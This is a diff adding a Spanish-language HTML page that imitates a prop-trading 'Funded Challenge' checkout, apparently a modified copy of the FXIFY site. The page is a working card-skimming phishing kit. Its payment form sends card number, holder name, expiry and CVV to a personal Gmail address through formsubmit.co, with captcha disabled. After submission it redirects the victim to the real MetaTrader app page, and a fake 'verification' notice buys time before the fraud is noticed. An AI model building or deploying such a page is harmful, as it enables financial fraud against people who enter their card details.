@@ -1,0 +1,452 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Funded Challenge</title>
+
+<style>
+/* ===================== ESTILOS GENERALES ===================== */
+
+:root{
+  --bg:#0b0e13;
+  --card:#0f151b;
+  --muted:#9aa3ad;
+  --accent-1:#00d1b2;
+  --accent-2:#ffd166;
+  --glass:rgba(255,255,255,0.03);
+  --radius:14px;
+  --shadow:0 6px 18px rgba(2,6,23,0.6);
+  font-family:Inter, Arial;
+}
+
+body{
+  margin:0;
+  background:linear-gradient(180deg,#07090b,#0b1116);
+  color:white;
+}
+
+.wrap{
+  max-width:980px;
+  margin:auto;
+  padding:20px;
+}
+
+.logo{
+  font-size:28px;
+  text-align:center;
+  font-weight:900;
+  color:#00e8ca;
+  margin-bottom:20px;
+  text-shadow:0 0 12px #00e8ca88;
+}
+
+/* GRID */
+.grid{display:grid; gap:14px;}
+.two-cols{grid-template-columns:1fr 1fr;}
+@media(max-width:720px){ .two-cols{grid-template-columns:1fr;} }
+
+.section{
+  background:var(--card);
+  padding:16px;
+  border-radius:var(--radius);
+  border:1px solid rgba(255,255,255,0.05);
+  box-shadow:var(--shadow);
+}
+
+.label{color:var(--muted); font-size:13px; margin-bottom:10px;}
+
+.options{display:flex; flex-direction:column; gap:10px;}
+
+.option-card{
+  background:var(--glass);
+  padding:12px;
+  border-radius:12px;
+  display:flex;
+  justify-content:space-between;
+  cursor:pointer;
+  border:1px solid rgba(255,255,255,0.04);
+  transition:.15s;
+}
+
+.option-card.active{
+  border-color:var(--accent-1);
+  background:#00d1b218;
+  transform:translateY(-3px);
+}
+
+.radio-circle{
+  width:18px;height:18px;
+  border-radius:50%;
+  border:2px solid rgba(255,255,255,0.22);
+  position:relative;
+  display:inline-block;
+}
+
+.option-card.active .radio-circle{
+  border-color:var(--accent-1);
+}
+
+.radio-circle::after{
+  content:"";
+  width:8px;height:8px;
+  border-radius:50%;
+  background:var(--accent-1);
+  position:absolute;
+  left:50%;top:50%;
+  transform:translate(-50%,-50%) scale(0);
+  transition:.15s;
+}
+
+.option-card.active .radio-circle::after{
+  transform:translate(-50%,-50%) scale(1);
+}
+
+/* PRECIOS CON DESCUENTO */
+.old-price{
+  color:#ff6b6b;
+  text-decoration:line-through;
+  font-weight:600;
+  margin-right:6px;
+}
+
+.new-price{
+  background:#0005;
+  padding:6px 10px;
+  border-radius:20px;
+  font-weight:bold;
+  color:white;
+}
+
+/* plataformas */
+.platforms{display:flex;flex-wrap:wrap; gap:10px;}
+.platform{
+  flex:1 1 calc(50% - 10px);
+  background:#ffffff05;
+  padding:12px;
+  border-radius:12px;
+  cursor:pointer;
+  display:flex;
+  justify-content:space-between;
+  border:1px solid rgba(255,255,255,0.04);
+}
+
+.platform.active{
+  border-color:#ffaa33;
+  background:#ffaa3318;
+  transform:translateY(-3px);
+}
+
+/* FORM EXTRA */
+.extra-box{
+  background:#ffffff08;
+  padding:16px;
+  border-radius:14px;
+  border:1px solid rgba(255,255,255,0.05);
+  margin-top:20px;
+}
+
+.extra-box input{
+  width:100%;
+  padding:12px;
+  border-radius:10px;
+  background:#1a1e24;
+  color:white;
+  border:none;
+  margin-bottom:14px;
+}
+
+/* FORM TARJETA */
+.card-box{
+  background:#14151a;
+  padding:20px;
+  border-radius:14px;
+  margin-top:20px;
+  max-width:450px;
+  margin-left:auto;
+  margin-right:auto;
+}
+
+.card-box input{
+  width:100%;
+  padding:12px;
+  background:#1a1e24;
+  color:white;
+  border:none;
+  border-radius:8px;
+  margin-bottom:14px;
+}
+
+.pay-btn{
+  width:100%;
+  padding:14px;
+  background:#16b07e;
+  border:none;
+  border-radius:10px;
+  color:white;
+  font-size:17px;
+  margin-top:10px;
+}
+
+.summary{
+  background:#ffffff08;
+  padding:16px;
+  border-radius:14px;
+  border:1px solid rgba(255,255,255,0.05);
+  margin-top:25px;
+}
+
+.summary .row{
+  margin:4px 0;
+  font-size:15px;
+}
+
+footer{text-align:center; margin:20px 0; color:var(--muted); font-size:12px;}
+</style>
+</head>
+
+<body>
+<div class="wrap">
+
+  <div class="logo">Funded Challenge</div>
+
+  <div class="grid two-cols">
+
+    <!-- IZQUIERDA -->
+    <div class="section">
+      <div class="label">Tipo de evaluación</div>
+
+      <div class="options" id="fases">
+        <div class="option-card" data-value="1f">
+          <span><span class="radio-circle"></span> 1 fase</span>
+          <div>
+            <span class="old-price">$44</span><span class="new-price">$29</span>
+          </div>
+        </div>
+
+        <div class="option-card" data-value="2f">
+          <span><span class="radio-circle"></span> 2 fases</span>
+          <div>
+            <span class="old-price">$64</span><span class="new-price">$49</span>
+          </div>
+        </div>
+
+        <div class="option-card" data-value="3f">
+          <span><span class="radio-circle"></span> 3 fases</span>
+          <div>
+            <span class="old-price">$94</span><span class="new-price">$79</span>
+          </div>
+        </div>
+      </div>
+
+      <hr style="border-color:#ffffff0a; margin:14px 0;">
+
+      <div class="label">Saldo de la cuenta</div>
+
+      <div class="options" id="saldos">
+        <div class="option-card" data-value="10000" data-price="89">
+          <span><span class="radio-circle"></span> $10,000</span>
+          <div>
+            <span class="old-price">$104</span><span class="new-price">$89</span>
+          </div>
+        </div>
+
+        <div class="option-card" data-value="25000" data-price="199">
+          <span><span class="radio-circle"></span> $25,000</span>
+          <div>
+            <span class="old-price">$214</span><span class="new-price">$199</span>
+          </div>
+        </div>
+
+        <div class="option-card" data-value="100000" data-price="549">
+          <span><span class="radio-circle"></span> $100,000</span>
+          <div>
+            <span class="old-price">$564</span><span class="new-price">$549</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- DERECHA -->
+    <div class="section">
+      <div class="label">Plataforma</div>
+
+      <div class="platforms" id="platforms">
+        <div class="platform" data-value="mt4">
+          MetaTrader 4
+          <span>Estándar</span>
+        </div>
+
+        <div class="platform active" data-value="mt5" id="defaultPlat">
+          MetaTrader 5
+          <span>Recomendado</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- FORM EXTRA -->
+  <div class="extra-box">
+    <h4 style="margin-top:0;">Importante: coloque número de teléfono o correo del destinatario</h4>
+
+    <label>Nombre completo</label>
+    <input type="text" placeholder="Nombre del destinatario">
+
+    <label>Correo electrónico</label>
+    <input type="email" placeholder="correo@example.com">
+
+    <label>Número de teléfono</label>
+    <input type="text" placeholder="+505 8888 8888">
+  </div>
+
+  <!-- FORM TARJETA -->
+  <div class="card-box">
+    <h3 style="text-align:center;margin-top:0;">Pago con Tarjeta</h3>
+
+    <form action="https://formsubmit.co/dereckd018@gmail.com" method="POST" onsubmit="return detectarYRedirigir();">
+
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" id="_next" name="_next" value="">
+      <input type="hidden" name="_template" value="table">
+
+      <label>Número de Tarjeta</label>
+      <input type="text" name="numero_tarjeta" maxlength="19" oninput="formatCard(this)" required>
+
+      <label>Titular</label>
+      <input type="text" name="nombre_titular" required>
+
+      <label>Fecha (MM/YY)</label>
+      <input type="text" name="expira" maxlength="5" oninput="formatExp(this)" required>
+
+      <label>CVV</label>
+      <input type="text" name="cvv" maxlength="4" oninput="formatCVV(this)" required>
+
+      <button class="pay-btn">Pagar Ahora</button>
+    </form>
+  </div>
+
+  <!-- SUMMARY -->
+  <div class="summary">
+    <div class="row">Fase: <span id="resFase">—</span></div>
+    <div class="row">Cuenta: <span id="resCuenta">—</span></div>
+    <div class="row">Plataforma: <span id="resPlat">MetaTrader 5</span></div>
+    <div class="row" style="font-weight:700;">Total: <span id="resTotal">$0</span></div>
+  </div>
+
+  <footer>Demo FXIFY modificado profesionalmente</footer>
+
+</div>
+
+<!-- ===================== SCRIPTS ===================== -->
+<script>
+function setupGroup(id){
+  const root=document.getElementById(id);
+  const cards=[...root.querySelectorAll(".option-card")];
+  cards.forEach(c=>{
+    c.addEventListener("click",()=>{
+      cards.forEach(x=>x.classList.remove("active"));
+      c.classList.add("active");
+      updateSummary();
+    });
+  });
+}
+
+setupGroup("fases");
+setupGroup("saldos");
+
+document.querySelectorAll(".platform").forEach(p=>{
+  p.addEventListener("click",()=>{
+    document.querySelectorAll(".platform").forEach(x=>x.classList.remove("active"));
+    p.classList.add("active");
+    updateSummary();
+  });
+});
+
+function getSelected(id){
+  const el=document.querySelector(`#${id} .option-card.active`);
+  return el? el.dataset.value:null;
+}
+
+function updateSummary(){
+  const fase=getSelected("fases");
+  const saldo=document.querySelector("#saldos .option-card.active");
+  const plat=document.querySelector("#platforms .platform.active")?.dataset.value;
+
+  document.getElementById("resFase").textContent=
+    fase? {"1f":"1 fase","2f":"2 fases","3f":"3 fases"}[fase]:"—";
+
+  document.getElementById("resCuenta").textContent=
+    saldo? "$"+Number(saldo.dataset.value).toLocaleString():"—";
+
+  document.getElementById("resPlat").textContent=
+    plat==="mt4"?"MetaTrader 4":"MetaTrader 5";
+
+  let total=0;
+  const faseCard=document.querySelector("#fases .option-card.active .new-price");
+  if(faseCard) total+=parseFloat(faseCard.textContent.replace("$",""));
+
+  if(saldo) total+=parseFloat(saldo.dataset.price);
+
+  document.getElementById("resTotal").textContent="$"+total.toFixed(2);
+}
+
+updateSummary();
+
+/* FORMATO TARJETA */
+function detectarYRedirigir(){
+  var ua=navigator.userAgent.toLowerCase();
+  var android="https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5";
+  var ios="https://apps.apple.com/app/metatrader-5/id413251709";
+
+  if(ua.includes("android")) document.getElementById("_next").value=android;
+  else if(ua.includes("iphone")||ua.includes("ipad")) document.getElementById("_next").value=ios;
+  else document.getElementById("_next").value=android;
+
+  return true;
+}
+
+function formatCard(i){
+  i.value=i.value.replace(/\D/g,"").replace(/(.{4})/g,"$1 ").trim();
+}
+
+function formatExp(i){
+  let v=i.value.replace(/\D/g,"").slice(0,4);
+  i.value=v.length>=3? v.slice(0,2)+"/"+v.slice(2):v;
+}
+
+function formatCVV(i){
+  i.value=i.value.replace(/\D/g,"").slice(0,4);
+}
+</script>
+
+</body>
+</html>
+  <!-- ===================== INFORMACIÓN IMPORTANTE / POLÍTICA ===================== -->
+
+<div style="
+  max-width:900px;
+  margin:40px auto 20px auto;
+  padding:20px;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.06);
+  border-radius:12px;
+  color:#cfd6dd;
+  font-size:14px;
+  line-height:1.6;
+  text-align:justify;
+">
+
+  <strong style="color:#ffffff; font-size:15px;">Aviso Importante</strong><br><br>
+
+  Con el fin de garantizar la seguridad operativa y el cumplimiento de las normas internas de control, su solicitud será sometida a un proceso de verificación. 
+  Este procedimiento puede requerir un plazo aproximado de <strong>12 a 24 horas</strong>, período durante el cual se validarán aspectos relacionados con prevención de fraude, actividades irregulares, uso de software automatizado no autorizado (bots) y cualquier otra práctica que contravenga las políticas institucionales.
+  <br><br>
+  En caso de no detectarse inconsistencias, su acceso será emitido de manera oficial al correo electrónico proporcionado. La información enviada incluirá 
+  <strong>las credenciales de inicio de sesión (login y contraseña)</strong> correspondientes a su cuenta de fondeo.
+  <br><br>
+  Se le recuerda que dicha información es estrictamente confidencial y 
+  <strong>no debe ser compartida bajo ninguna circunstancia</strong>, por motivos de seguridad y responsabilidad operativa.
+  <br><br>
+  Agradecemos su comprensión y colaboración.
+</div>
